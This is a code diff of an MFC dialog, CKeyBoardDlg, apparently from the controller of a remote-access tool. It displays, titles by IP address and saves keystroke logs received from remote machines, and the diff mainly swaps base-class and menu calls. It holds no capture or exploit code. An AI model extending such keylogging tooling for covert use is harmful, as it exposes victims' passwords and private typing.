@@ -28,7 +28,7 @@ CKeyBoardDlg::CKeyBoardDlg(CWnd* pParent, Server* pIOCPServer, ClientContext *pC
 
 void CKeyBoardDlg::DoDataExchange(CDataExchange* pDX)
 {
-    CDialog::DoDataExchange(pDX);
+    __super::DoDataExchange(pDX);
     //{{AFX_DATA_MAP(CKeyBoardDlg)
     DDX_Control(pDX, IDC_EDIT, m_edit);
     //}}AFX_DATA_MAP
@@ -49,13 +49,12 @@ END_MESSAGE_MAP()
 void CKeyBoardDlg::PostNcDestroy()
 {
     // TODO: Add your specialized code here and/or call the base class
-    delete this;
-    CDialog::PostNcDestroy();
+    __super::PostNcDestroy();
 }
 
 BOOL CKeyBoardDlg::OnInitDialog()
 {
-    CDialog::OnInitDialog();
+    __super::OnInitDialog();
 
     // TODO: Add extra initialization here
     SetIcon(m_hIcon, TRUE);			// Set big icon
@@ -64,10 +63,10 @@ BOOL CKeyBoardDlg::OnInitDialog()
     CMenu* pSysMenu = GetSystemMenu(FALSE);
     if (pSysMenu != NULL) {
         //pSysMenu->DeleteMenu(SC_TASKLIST, MF_BYCOMMAND);
-        pSysMenu->AppendMenu(MF_SEPARATOR);
-        pSysMenu->AppendMenu(MF_STRING, IDM_ENABLE_OFFLINE, "离线记录(&O)");
-        pSysMenu->AppendMenu(MF_STRING, IDM_CLEAR_RECORD, "清空记录(&C)");
-        pSysMenu->AppendMenu(MF_STRING, IDM_SAVE_RECORD, "保存记录(&S)");
+        pSysMenu->AppendMenuSeparator(MF_SEPARATOR);
+        pSysMenu->AppendMenuL(MF_STRING, IDM_ENABLE_OFFLINE, "离线记录(&O)");
+        pSysMenu->AppendMenuL(MF_STRING, IDM_CLEAR_RECORD, "清空记录(&C)");
+        pSysMenu->AppendMenuL(MF_STRING, IDM_SAVE_RECORD, "保存记录(&S)");
         if (m_bIsOfflineRecord)
             pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_CHECKED);
     }
@@ -88,7 +87,7 @@ BOOL CKeyBoardDlg::OnInitDialog()
 void CKeyBoardDlg::UpdateTitle()
 {
     CString str;
-    str.Format(_T("%s - 键盘记录"), m_IPAddress);
+    str.FormatL(_T("%s - 键盘记录"), m_IPAddress);
     if (m_bIsOfflineRecord)
         str += " (离线记录已开启)";
     else
@@ -118,14 +117,14 @@ void CKeyBoardDlg::AddKeyBoardData()
 
 bool CKeyBoardDlg::SaveRecord()
 {
-    CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.txt");
+    CString	strFileName = m_IPAddress + CTime::GetCurrentTime().FormatL("_%Y-%m-%d_%H-%M-%S.txt");
     CFileDialog dlg(FALSE, "txt", strFileName, OFN_OVERWRITEPROMPT, "文本文档(*.txt)|*.txt|", this);
     if(dlg.DoModal () != IDOK)
         return false;
 
     CFile	file;
     if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate)) {
-        MessageBox("文件保存失败："+dlg.GetPathName(), "提示");
+        MessageBoxL("文件保存失败："+dlg.GetPathName(), "提示", MB_ICONINFORMATION);
         return false;
     }
     // Write the DIB header and the bits
@@ -159,7 +158,7 @@ void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
     } else if (nID == IDM_SAVE_RECORD) {
         SaveRecord();
     } else {
-        CDialog::OnSysCommand(nID, lParam);
+        __super::OnSysCommand(nID, lParam);
     }
 }
 
@@ -176,7 +175,7 @@ void CKeyBoardDlg::ResizeEdit()
 }
 void CKeyBoardDlg::OnSize(UINT nType, int cx, int cy)
 {
-    CDialog::OnSize(nType, cx, cy);
+    __super::OnSize(nType, cx, cy);
 
     // TODO: Add your message handler code here
     if (IsWindowVisible())
@@ -190,7 +189,7 @@ BOOL CKeyBoardDlg::PreTranslateMessage(MSG* pMsg)
     if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)) {
         return true;
     }
-    return CDialog::PreTranslateMessage(pMsg);
+    return __super::PreTranslateMessage(pMsg);
 }
 
 void CKeyBoardDlg::OnClose()
